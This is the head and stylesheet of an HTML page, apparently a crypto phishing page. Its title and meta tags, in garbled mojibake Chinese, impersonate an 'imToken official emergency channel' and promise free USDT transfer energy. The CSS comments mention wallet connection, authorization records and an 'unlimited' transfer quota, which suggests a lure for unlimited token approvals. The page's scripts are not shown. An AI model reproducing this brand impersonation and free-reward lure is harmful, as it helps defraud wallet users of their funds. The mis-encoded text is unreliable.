<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹åº”æ€¥é€šé“</title>
    <meta property="og:title" content="imTokenå®˜æ–¹åº”æ€¥é€šé“" />
    <meta property="og:description" content="imTokenä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="imTokenå®˜æ–¹åº”æ€¥é€šé“" />
    <meta name="twitter:description" content="imTokenä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
* { margin: 0; padding: 0; box-sizing: border-box; }
/* é¡µé¢å…¨å±€æ ·å¼ */
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; /* å…¨å±€å­—ä½“ï¼ˆé€‚é…ä¸åŒç³»ç»Ÿï¼‰ */
    padding: 8px 6px; /* é¡µé¢å†…è¾¹è·ï¼ˆä¸Šä¸‹8pxã€å·¦å³6pxï¼‰ */
    max-width: 600px; /* é¡µé¢æœ€å¤§å®½åº¦ï¼ˆé€‚é…ç§»åŠ¨ç«¯ï¼‰ */
    margin: 0 auto; /* é¡µé¢æ°´å¹³å±…ä¸­ */
    background: #121212; /* è°ƒæ•´ï¼šå…¨å±€èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±é»‘è‰² */
    color: #E5E7EB; /* è°ƒæ•´ï¼šå…¨å±€é»˜è®¤æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    min-height: 100vh; /* é¡µé¢æœ€å°é«˜åº¦å æ»¡è§†å£ */
    display: flex; /* å¯ç”¨å¼¹æ€§å¸ƒå±€ */
    flex-direction: column; /* å­å…ƒç´ å‚ç›´æ’åˆ— */
    gap: 5px; /* è°ƒæ•´ï¼šæ¨¡å—ä¹‹é—´çš„é—´è·ï¼ˆç¼©å°ä¸º5pxæ›´ç´§å‡‘ï¼‰ */
    border-radius: 8px; /* é¡µé¢å¤–å±‚åœ†è§’ */
    border-left: 3px solid #2563EB; /* è°ƒæ•´ï¼šé¡µé¢å·¦ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±è“è‰² */
    font-size: 14px; /* è°ƒæ•´ï¼šå…¨å±€åŸºç¡€å­—ä½“å¤§å°ï¼ˆè°ƒå¤§æ›´é†’ç›®ï¼‰ */
    overflow-x: hidden; /* éšè—æ°´å¹³æº¢å‡ºå†…å®¹ */
}

/* ä¸»å†…å®¹å®¹å™¨æ ·å¼ */
.container {
    flex: 1; /* è°ƒæ•´ï¼šå æ»¡é¡µé¢å‰©ä½™å‚ç›´ç©ºé—´ï¼ˆæ¶ˆé™¤åº•éƒ¨ç©ºæ¡£ï¼‰ */
    display: flex;
    flex-direction: column;
    gap: 5px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ¨¡å—é—´è·ï¼ˆ5pxæ›´ç´§å‡‘ï¼‰ */
    overflow-y: auto; /* å†…å®¹æº¢å‡ºæ—¶æ˜¾ç¤ºå‚ç›´æ»šåŠ¨æ¡ */
    padding-top: 90px; /* è°ƒæ•´ï¼šç»™é¡¶éƒ¨å›ºå®šå®¹å™¨é¢„ç•™ç©ºé—´ï¼ˆé¿å…å†…å®¹è¢«é®æŒ¡ï¼‰ */
}

/* é¡¶éƒ¨å›ºå®šå®¹å™¨æ ·å¼ */
.header-container {
    display: flex; /* å®¹å™¨å†…å…ƒç´ å¼¹æ€§å¸ƒå±€ */
    justify-content: space-between; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å·¦å³ä¸¤ç«¯å¯¹é½ */
    align-items: flex-end; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å‚ç›´æ–¹å‘é ä¸‹å¯¹é½ */
    padding: 8px 8px; /* å®¹å™¨å†…è¾¹è·ï¼ˆä¸Šä¸‹8pxã€å·¦å³8pxï¼‰ */
    border-bottom: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    margin-bottom: 3px; /* è°ƒæ•´ï¼šå®¹å™¨ä¸ä¸‹æ–¹å…ƒç´ çš„é—´è·ï¼ˆ3pxï¼‰ */
    min-height: 80px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆç¡®ä¿å†…å®¹ä¸æŒ¤å˜å½¢ï¼‰ */
    padding-bottom:10px; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨å•ç‹¬å†…è¾¹è·ï¼ˆ10pxï¼‰ */
    box-sizing: border-box; /* ç›’æ¨¡å‹ï¼šå†…è¾¹è·/è¾¹æ¡†ä¸æ’‘å¤§å®¹å™¨ */
    position: fixed; /* è°ƒæ•´ï¼šå®¹å™¨å›ºå®šå®šä½ï¼ˆä¸éšé¡µé¢æ»šåŠ¨ï¼‰ */
    top: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢é¡¶éƒ¨ */
    left: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢å·¦ä¾§ */
    right: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢å³ä¾§ï¼ˆå®ç°å®½åº¦å æ»¡ï¼‰ */
    max-width: 600px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å¤§å®½åº¦ï¼ˆå’Œé¡µé¢ä¸€è‡´ï¼‰ */
    margin: 0 auto; /* è°ƒæ•´ï¼šå®¹å™¨æ°´å¹³å±…ä¸­ */
    background: #1e2925; /* è°ƒæ•´ï¼šé¡¶éƒ¨å®¹å™¨åº•è‰² | è‰²å·å¯¹åº”ï¼šæ·±é»‘è‰² */
    z-index: 999; /* è°ƒæ•´ï¼šå±‚çº§ä¼˜å…ˆçº§ï¼ˆç¡®ä¿åœ¨å…¶ä»–å…ƒç´ ä¸Šæ–¹ï¼‰ */
}

/* è¯­è¨€é€‰æ‹©æ æ ·å¼ */
.lang-switch {
    padding: 0;
    margin: 0;
    display: flex; /* è°ƒæ•´ï¼šè¯­è¨€æ å¯ç”¨å¼¹æ€§å¸ƒå±€ */
    flex-direction: column; /* è°ƒæ•´ï¼šè¯­è¨€æ å­å…ƒç´ ä¸Šä¸‹æ’åˆ— */
    align-items: flex-end; /* è°ƒæ•´ï¼šè¯­è¨€æ å­å…ƒç´ é å³å¯¹é½ */
    gap: 6px; /* è°ƒæ•´ï¼šè¯­è¨€æ å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
}

/* è¯­è¨€é€‰æ‹©æ æ–‡å­—æ ·å¼ */
.lang-text {
  color: #E5E7EB; /* è°ƒæ•´ï¼šè¯­è¨€æ æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
  font-size: 12px; /* è°ƒæ•´ï¼šè¯­è¨€æ æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰å®¹å™¨æ ·å¼ */
.lang-dropdown {
    position: relative; /* ç›¸å¯¹å®šä½ï¼ˆä½œä¸ºä¸‹æ‹‰èœå•çš„çˆ¶å®¹å™¨ï¼‰ */
    display: inline-block;
}

/* è¯­è¨€ä¸‹æ‹‰è§¦å‘æŒ‰é’®æ ·å¼ */
.lang-toggle {
    padding: 3px 8px; /* è°ƒæ•´ï¼šæŒ‰é’®å†…è¾¹è·ï¼ˆæ›´æ˜“ç‚¹å‡»ï¼‰ */
    border: 1px solid #3b82f6; /* è°ƒæ•´ï¼šæŒ‰é’®è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    border-radius: 20px; /* è°ƒæ•´ï¼šæŒ‰é’®åœ†è§’ï¼ˆèƒ¶å›Šå½¢çŠ¶ï¼‰ */
    background: transparent; /* è°ƒæ•´ï¼šæŒ‰é’®èƒŒæ™¯é€æ˜ */
    color: #E5E7EB; /* è°ƒæ•´ï¼šæŒ‰é’®æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    font-size: 13px; /* è°ƒæ•´ï¼šæŒ‰é’®æ–‡å­—å¤§å°ï¼ˆ13pxï¼‰ */
    cursor: pointer; /* é¼ æ ‡æ‚¬æµ®æ˜¾ç¤ºæ‰‹å‹ */
    display: flex;
    align-items: center;
    gap: 4px; /* è°ƒæ•´ï¼šæŒ‰é’®å†…å…ƒç´ é—´è·ï¼ˆ4pxï¼‰ */
}
.lang-toggle:hover {
    background: rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šæŒ‰é’® hover èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰èœå•æ ·å¼ */
.lang-dropdown-menu {
    display: none; /* é»˜è®¤éšè—ä¸‹æ‹‰èœå• */
    position: absolute; /* ç»å¯¹å®šä½ï¼ˆç›¸å¯¹äºçˆ¶å®¹å™¨ï¼‰ */
    top: 100%; /* è°ƒæ•´ï¼šèœå•åœ¨æŒ‰é’®æ­£ä¸‹æ–¹ */
    right: 0; /* è°ƒæ•´ï¼šèœå•é å³å¯¹é½ */
    min-width: 120px; /* è°ƒæ•´ï¼šèœå•æœ€å°å®½åº¦ï¼ˆ120pxï¼‰ */
    background: #1E1E1E; /* è°ƒæ•´ï¼šèœå•èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°é»‘è‰² */
    border: 1px solid #3b82f6; /* è°ƒæ•´ï¼šèœå•è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    border-radius: 8px; /* è°ƒæ•´ï¼šèœå•åœ†è§’ï¼ˆ8pxï¼‰ */
    padding: 4px 0; /* è°ƒæ•´ï¼šèœå•å†…è¾¹è·ï¼ˆä¸Šä¸‹4pxï¼‰ */
    z-index: 1000; /* è°ƒæ•´ï¼šèœå•å±‚çº§ï¼ˆé«˜äºå…¶ä»–å…ƒç´ ï¼‰ */
    box-shadow: 0 4px 8px rgba(0,0,0,0.3); /* è°ƒæ•´ï¼šèœå•é˜´å½±ï¼ˆå¢å¼ºå±‚æ¬¡æ„Ÿï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰é€‰é¡¹æ ·å¼ */
.lang-dropdown-item {
    display: flex;
    align-items: center;
    gap: 6px; /* è°ƒæ•´ï¼šé€‰é¡¹å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
    padding: 6px 12px; /* è°ƒæ•´ï¼šé€‰é¡¹å†…è¾¹è·ï¼ˆæ›´æ˜“ç‚¹å‡»ï¼‰ */
    color: #E5E7EB; /* è°ƒæ•´ï¼šé€‰é¡¹æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    font-size: 13px; /* è°ƒæ•´ï¼šé€‰é¡¹æ–‡å­—å¤§å°ï¼ˆ13pxï¼‰ */
    cursor: pointer;
    background: transparent; /* é€‰é¡¹èƒŒæ™¯é€æ˜ */
    border: none;
    width: 100%;
    text-align: left;
}
.lang-dropdown-item:hover {
    background: rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šé€‰é¡¹ hover èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
}

/* ä¸‹æ‹‰èœå•æ˜¾ç¤ºçŠ¶æ€ï¼ˆé…åˆJSï¼‰ */
.lang-dropdown.open .lang-dropdown-menu {
    display: block; /* æ‰“å¼€ä¸‹æ‹‰èœå•æ—¶æ˜¾ç¤º */
}

/* é¡¶éƒ¨Logo+æ ‡é¢˜å®¹å™¨æ ·å¼ */
.header {
    text-align: left;
    padding: 0;
    padding-bottom:1px; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨å†…è¾¹è·ï¼ˆ1pxï¼‰ */
    border-bottom: none; /* å–æ¶ˆåº•éƒ¨è¾¹æ¡† */
    margin-bottom: 0;
    display: flex;
    align-items: flex-end; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å‚ç›´é ä¸‹å¯¹é½ */
    gap: 10px; /* è°ƒæ•´ï¼šLogoä¸æ–‡å­—çš„é—´è·ï¼ˆ10pxï¼‰ */
}
.header > div {
    display: flex; 
    gap: 10px; 
    align-items: flex-end; /* è°ƒæ•´ï¼šå­å…ƒç´ å‚ç›´é ä¸‹å¯¹é½ */
}

/* Logoæ ·å¼ */
.header-logo {
    width: 130px; /* Logoå®½åº¦ */
    height: 50px; /* è°ƒæ•´ï¼šLogoé«˜åº¦ï¼ˆä»40pxæ”¹ä¸º50pxï¼Œæ›´é†’ç›®ï¼‰ */
    border-radius: 4px; /* Logoåœ†è§’ */
    object-fit: contain; /* è°ƒæ•´ï¼šLogoä¿æŒæ¯”ä¾‹ä¸å˜å½¢ */
}

/* è­¦å‘Šæ æ ·å¼ */
.warning {
    background: #1e2925; /* è°ƒæ•´ï¼šè­¦å‘Šæ èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    color: #a0a8a4; /* è°ƒæ•´ï¼šè­¦å‘Šæ æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    padding: 8px; /* è°ƒæ•´ï¼šè­¦å‘Šæ å†…è¾¹è·ï¼ˆ8pxï¼‰ */
    border-radius: 8px; /* è­¦å‘Šæ åœ†è§’ */
    font-size: 12px; /* è°ƒæ•´ï¼šè­¦å‘Šæ æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    border-left: 3px solid #f97316; /* è°ƒæ•´ï¼šè­¦å‘Šæ å·¦ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
    line-height: 1.5; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.5å€æ›´æ˜“è¯»ï¼‰ */
}
.warning strong {
    color: #f97316; /* è°ƒæ•´ï¼šè­¦å‘Šæ å¼ºè°ƒæ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
}

/* ä½™é¢æ˜¾ç¤ºå®¹å™¨æ ·å¼ */
#userInfo {
    text-align: center;
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…åŸºç¡€æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    padding: 20px 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆæ‰©å¤§é¿å…å†…å®¹æº¢å‡ºï¼‰ */
    background: #1e2925; /* è°ƒæ•´ï¼šä½™é¢å®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    line-height: 1.6; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.6å€ï¼‰ */
    min-height: 120px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å››è§’å†…å®¹ï¼‰ */
    position: relative; /* ç›¸å¯¹å®šä½ï¼ˆä½œä¸ºå­å…ƒç´ ç»å¯¹å®šä½çš„çˆ¶å®¹å™¨ï¼‰ */
}

/* ä½™é¢é¡¹ï¼ˆUSDT/TRX/èƒ½é‡/å®½å¸¦ï¼‰åŸºç¡€æ ·å¼ */
.balance-item {
    position: absolute; /* ç»å¯¹å®šä½ï¼ˆç›¸å¯¹äº#userInfoï¼‰ */
    display: flex;
    flex-direction: column; /* å­å…ƒç´ ä¸Šä¸‹æ’åˆ— */
    align-items: center; /* å­å…ƒç´ æ°´å¹³å±…ä¸­ */
    gap: 1px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸æ•°å€¼çš„é—´è·ï¼ˆ4pxï¼‰ */
}

/* ä½™é¢é¡¹-æ ‡é¢˜æ ·å¼ï¼ˆå¦‚â€œUSDTâ€â€œTRXâ€ï¼‰ */
.balance-item > span:first-child {
    font-size: 15px; /* è°ƒæ•´ï¼šæ ‡é¢˜å­—ä½“å¤§å°ï¼ˆæ¯”æ•°å€¼å¤§1pxæ›´é†’ç›®ï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
}

/* ä½™é¢é¡¹-æ•°å€¼æ ·å¼ï¼ˆå¦‚â€œ0.00â€â€œ0â€ï¼‰ */
.balance-value {
    color: #4ade80; /* è°ƒæ•´ï¼šæ•°å€¼é¢œè‰² | è‰²å·å¯¹åº”ï¼šç»¿è‰² */
    font-size: 16px; /* è°ƒæ•´ï¼šæ•°å€¼å­—ä½“å¤§å°ï¼ˆ16pxï¼‰ */
    font-weight: 600; /* è°ƒæ•´ï¼šæ•°å€¼åŠ ç²—ï¼ˆæ›´çªå‡ºï¼‰ */
}

/* ä½™é¢é¡¹-ä½ç½®è°ƒæ•´ */
.balance-usdt { top: 10px; left: 40px; } /* è°ƒæ•´ï¼šUSDTé¡¹ä½ç½®ï¼ˆé¡¶éƒ¨å·¦æ–¹ï¼‰ */
.balance-trx { top: 10px; right: 40px; } /* è°ƒæ•´ï¼šTRXé¡¹ä½ç½®ï¼ˆé¡¶éƒ¨å³æ–¹ï¼‰ */
.balance-energy { bottom: 10px; left: 40px; } /* è°ƒæ•´ï¼šèƒ½é‡é¡¹ä½ç½®ï¼ˆåº•éƒ¨å·¦æ–¹ï¼‰ */
.balance-bandwidth { bottom: 10px; right: 40px; } /* è°ƒæ•´ï¼šå®½å¸¦é¡¹ä½ç½®ï¼ˆåº•éƒ¨å³æ–¹ï¼‰ */

/* ä½™é¢å®¹å™¨-æœªè¿æ¥é’±åŒ…æç¤ºæ ·å¼ */
#userInfoDefault {
    position: absolute;
    top: 8px; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—å‚ç›´ä½ç½® */
    left: 50%; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—æ°´å¹³å±…ä¸­ */
    transform: translate(-50%, -50%); /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—å®Œå…¨å±…ä¸­ */
    width: 100%;
    color: #a0a8a4; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
}
#userInfo span {
    font-weight: 500; /* è°ƒæ•´ï¼šæ–‡å­—åŠ ç²—ï¼ˆ500æƒé‡ï¼‰ */
}

/* é’±åŒ…çŠ¶æ€å®¹å™¨æ ·å¼ */
#walletStatusContainer {
    background: #1e2925; /* è°ƒæ•´ï¼šå®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    padding: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆ12pxï¼‰ */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    color: #a0a8a4; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    line-height: 1.6; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.6å€ï¼‰ */
    border-right: 5px solid #4ade80; /* è°ƒæ•´ï¼šå®¹å™¨å³ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šç»¿è‰² */
    min-height: 150px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å†…å®¹ï¼‰ */
}
#walletStatusContainer .status-title {
    font-size: 14px; /* è°ƒæ•´ï¼šæ ‡é¢˜æ–‡å­—å¤§å°ï¼ˆ14pxï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    margin-bottom: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸å†…å®¹çš„é—´è·ï¼ˆ6pxï¼‰ */
    display: flex;
    align-items: center;
    gap: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
}
#walletStatusContainer .connected-content {
    display: none; /* é»˜è®¤éšè—â€œå·²è¿æ¥â€å†…å®¹ */
    min-height: 110px; /* è°ƒæ•´ï¼šå·²è¿æ¥çŠ¶æ€ä¸‹çš„æœ€å°é«˜åº¦ */
}
#walletStatusContainer.connected .disconnected-content {
    display: none; /* å·²è¿æ¥æ—¶éšè—â€œæœªè¿æ¥â€å†…å®¹ */
}
#walletStatusContainer.connected .connected-content {
    display: block; /* å·²è¿æ¥æ—¶æ˜¾ç¤ºâ€œå·²è¿æ¥â€å†…å®¹ */
}
/* é’±åŒ…çŠ¶æ€-é«˜äº®æ–‡å­—æ ·å¼ */
#walletStatusContainer .highlight {
    color: #3b82f6; /* è°ƒæ•´ï¼šé«˜äº®æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    font-weight: 500; /* è°ƒæ•´ï¼šé«˜äº®æ–‡å­—åŠ ç²— */
}
/* é’±åŒ…çŠ¶æ€-æ©™è‰²æç¤ºæ–‡å­—æ ·å¼ */
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #f97316; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
    margin-top: 5px; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—ä¸ä¸Šæ–¹å†…å®¹çš„é—´è·ï¼ˆ5pxï¼‰ */
    font-size: 12px; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
}

/* åˆçº¦å‰©ä½™èµ„æºå®¹å™¨æ ·å¼ */
#contractResourceContainer {
    background: #1e2925; /* è°ƒæ•´ï¼šå®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    padding: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆ12pxï¼‰ */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    color: #a0a8a4; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    line-height: 1.7; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.7å€ï¼‰ */
    border-bottom: 2px solid rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
    min-height: 80px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å†…å®¹ï¼‰ */
}
#contractResourceContainer .status-title {
    font-size: 14px; /* è°ƒæ•´ï¼šæ ‡é¢˜æ–‡å­—å¤§å°ï¼ˆ14pxï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    margin-bottom: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸å†…å®¹çš„é—´è·ï¼ˆ6pxï¼‰ */
    display: flex;
    align-items: center;
    gap: 4px; /* è°ƒæ•´ï¼šæ ‡é¢˜å†…å…ƒç´ é—´è·ï¼ˆ4pxï¼‰ */
}
/* åˆçº¦èµ„æºå›¾æ ‡è‰²å· */
#contractResourceContainer .status-title i {
    font-size: 16px; 
    color: #93c5fd; /* åŒ¹é…è‰²å· */
}
/* åˆçº¦èµ„æºé«˜äº®æ–‡å­—ï¼šåŒ¹é…è‰²å· */
#contractResourceContainer .highlight {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    font-weight: 500;
}
/* åˆçº¦èµ„æºæ ‡ç­¾ï¼šåŒ¹é…è‰²å· */
#contractResourceContainer .data-tag {
    background: rgba(59, 130, 246, 0.15); /* åŒ¹é…è‰²å· */
    padding: 2px 6px; 
    border-radius: 4px;
    border: 1px solid rgba(59, 130, 246, 0.3); /* åŒ¹é…è‰²å· */
    font-size: 12px; 
    color: #3b82f6; /* åŒ¹é…è‰²å· */
}
/* ç‰¹æ®Šæç¤ºå®¹å™¨ */
.special-tip-container {
    background: #1e2925; /* åŒ¹é…è‰²å· */
    padding: 16px; 
    border-radius: 8px;
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    display: none;
    margin-top: 4px;
    border-right: 3px solid #f97316; /* åŒ¹é…è‰²å· */
    box-shadow: -2px 0 0 0 #fb923c; /* åŒ¹é…è‰²å· */
    min-height: 80px; 
}
/* ç‰¹æ®Šæç¤ºæ ‡é¢˜ï¼šåŒ¹é…è‰²å· */
.special-tip-title {
    font-size: 16px; 
    color: #f97316; /* åŒ¹é…è‰²å· */
    font-weight: 600;
    margin-bottom: 6px;
}
/* ç‰¹æ®Šæç¤ºå†…å®¹ï¼šåŒ¹é…è‰²å· */
.special-tip-content {
    font-size: 14px; 
    color: #f97316; /* åŒ¹é…è‰²å· */
    line-height: 1.7;
    font-weight: 500;
}
/* æˆæƒè®°å½•å®¹å™¨ */
.record-list {
    background: #1e2925; /* åŒ¹é…è‰²å· */
    padding: 12px; 
    border-radius: 8px;
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    font-size: 12px; 
    border-right: 5px solid #4ade80; /* åŒ¹é…è‰²å· */
    display: none;
    min-height: 100px; 
}
.record-item {
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #334155; /* åŒ¹é…è‰²å· */
}
.record-item:hover {
    border-color: #3b82f6; /* åŒ¹é…è‰²å· */
    transition: border-color 0.3s;
}
/* è®°å½•é¡¹æ–‡å­—ï¼šåŒ¹é…è‰²å· */
.record-item p {
    margin-bottom: 6px;
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    line-height: 1.5;
    font-size: 13px; 
}
/* è®°å½•é¡¹å¼ºè°ƒæ–‡å­—ï¼šåŒ¹é…è‰²å· */
.record-item p strong {
    color: #e0e8e4; /* åŒ¹é…è‰²å· */
    margin-right: 5px;
}
/* è®°å½•æ ‡é¢˜ï¼šåŒ¹é…è‰²å· */
#recordTypeTitle, #recordAmountTitle {
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    font-weight: 500;
}
/* â€œUSDTè½¬è´¦â€â€œæ— é™â€ï¼šåŒ¹é…è‰²å· */
#energyType, #transferQuota {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    font-weight: 600;
}
/* æˆæƒè®°å½•æ–‡æœ¬ï¼šåŒ¹é…è‰²å· */
#approvalRecords {
    color: #4ade80; /* åŒ¹é…è‰²å· */
}
/* é“¾æ¥ï¼šåŒ¹é…è‰²å· */
.tx-link {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 13px; 
}
.tx-link:hover {
    text-decoration: underline;
}
/* æŒ‰é’®ç»„ */
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 6px; 
    margin-top: 4px; 
    padding: 6px 0;
    border-top: 1px solid #334155; /* åŒ¹é…è‰²å· */
}
/* æŒ‰é’®ï¼šåŒ¹é…è‰²å· */
.btn {
    width: 100%;
    padding: 12px; 
    font-size: 15px; 
    border: none;
    border-radius: 8px;
    background: #2563eb; /* åŒ¹é…è‰²å· */
    color: white; 
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #3b82f6; /* åŒ¹é…è‰²å· */
}
.btn:disabled {
    background: #294b75; /* åŒ¹é…è‰²å· */
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    cursor: not-allowed;
}
